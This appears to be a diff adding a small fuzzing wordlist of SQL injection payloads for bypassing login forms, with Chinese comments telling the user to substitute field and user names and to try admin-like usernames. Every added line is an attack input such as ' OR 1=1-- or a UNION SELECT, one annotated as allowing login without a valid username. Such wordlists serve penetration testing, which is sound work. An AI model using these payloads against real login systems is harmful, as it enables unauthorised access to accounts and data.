@@ -1,0 +1,8 @@
+＃regex替换尽可能多的你的fuzzer最好的结果：
+＃<user-fieldname> <pass-fieldname> <username>
+＃也试图强制列出可能的用户名，包括拥有管理员名称
+<username>' OR 1=1--
+'OR '' = '	允许无需有效用户名的认证。
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
